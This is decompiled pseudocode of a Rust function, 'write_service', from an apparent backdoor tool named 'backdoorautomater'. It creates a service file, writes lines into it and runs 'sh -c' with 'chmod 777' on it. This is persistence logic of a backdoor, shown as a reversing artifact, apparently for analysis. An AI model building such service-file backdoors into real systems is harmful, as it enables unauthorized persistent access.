__int64 __fastcall backdoorautomater::modifyservice::write_service(__int64 a1, __int128 *a2, __int64 a3)
{
  __int64 v4; // rbp
  __int128 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rdx
  unsigned int v12; // [rsp+Ch] [rbp-1DCh] BYREF
  __int128 v13; // [rsp+10h] [rbp-1D8h] BYREF
  __int64 v14; // [rsp+20h] [rbp-1C8h]
  _BYTE v15[24]; // [rsp+30h] [rbp-1B8h] BYREF
  __int128 v16; // [rsp+48h] [rbp-1A0h] BYREF
  __int64 v17; // [rsp+58h] [rbp-190h]
  __int128 v18; // [rsp+80h] [rbp-168h] BYREF
  __int64 v19; // [rsp+90h] [rbp-158h]
  __int128 v20; // [rsp+A0h] [rbp-148h] BYREF
  __int64 v21; // [rsp+B0h] [rbp-138h]
  __int64 v22; // [rsp+C0h] [rbp-128h]
  __int64 v23; // [rsp+C8h] [rbp-120h]
  __int128 v24; // [rsp+E0h] [rbp-108h] BYREF
  _BYTE v25[24]; // [rsp+F0h] [rbp-F8h]
  __int64 v26; // [rsp+108h] [rbp-E0h]

  *(_QWORD *)v25 = *((_QWORD *)a2 + 2);
  v24 = *a2;
  *(_OWORD *)&v25[8] = *(_OWORD *)a1;
  v26 = *(_QWORD *)(a1 + 16);
  alloc::str::join_generic_copy(&v16, &v24, 2LL, 1LL, 0LL);
  *(_QWORD *)&v15[16] = v17;
  *(_OWORD *)v15 = v16;
  core::ptr::drop_in_place<[alloc::string::String; 2]>(&v24);
  *(_QWORD *)&v24 = aChmod777;
  *((_QWORD *)&v24 + 1) = 10LL;
  *(_OWORD *)v25 = *(_OWORD *)&v15[8];
  alloc::str::join_generic_copy(&v16, &v24, 2LL, 1LL, 0LL);
  v19 = v17;
  v18 = v16;
  std::fs::File::create(&v24, v15);
  if ( (_DWORD)v24 )
  {
    v4 = *((_QWORD *)&v24 + 1);
  }
  else
  {
    v12 = DWORD1(v24);
    *(_QWORD *)&v5 = <&alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(a3);
    v13 = v5;
    v6 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v13);
    if ( !v6 )
    {
LABEL_7:
      std::process::Command::new(&v24, aSh, 2LL);
      v7 = std::process::Command::arg(&v24, aC_1, 2LL);
      v8 = std::process::Command::arg(v7, &v18);
      std::process::Command::output(&v16, v8);
      core::result::Result<T,E>::expect(&v20, &v16, &off_229F60);
      core::ptr::drop_in_place<std::process::Command>(&v24);
      alloc::string::String::from_utf8_lossy(&v16, v22, v23);
      v9 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v16);
      <T as alloc::slice::hack::ConvertVec>::to_vec(&v24, v9, v10);
      v14 = *(_QWORD *)v25;
      v13 = v24;
      core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v16);
      backdoorautomater::sanitizer::sanitize_system_command((__int64)&v13);
      core::ptr::drop_in_place<alloc::string::String>(&v13);
      core::ptr::drop_in_place<std::process::Output>(&v20);
      core::ptr::drop_in_place<std::fs::File>(v12);
      core::ptr::drop_in_place<alloc::string::String>(&v18);
      core::ptr::drop_in_place<alloc::string::String>(v15);
      return 0LL;
    }
    while ( 1 )
    {
      v24 = *(_OWORD *)(v6 + 8);
      *(_QWORD *)v25 = asc_165765;
      *(_QWORD *)&v25[8] = 1LL;
      alloc::str::join_generic_copy(&v16, &v24, 2LL, 1LL, 0LL);
      v21 = v17;
      v20 = v16;
      v4 = std::io::Write::write_all(&v12, *((_QWORD *)&v16 + 1), v17);
      if ( v4 )
        break;
      core::ptr::drop_in_place<alloc::string::String>(&v20);
      v6 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v13);
      if ( !v6 )
        goto LABEL_7;
    }
    core::ptr::drop_in_place<alloc::string::String>(&v20);
    core::ptr::drop_in_place<std::fs::File>(v12);
  }
  core::ptr::drop_in_place<alloc::string::String>(&v18);
  core::ptr::drop_in_place<alloc::string::String>(v15);
  return v4;
}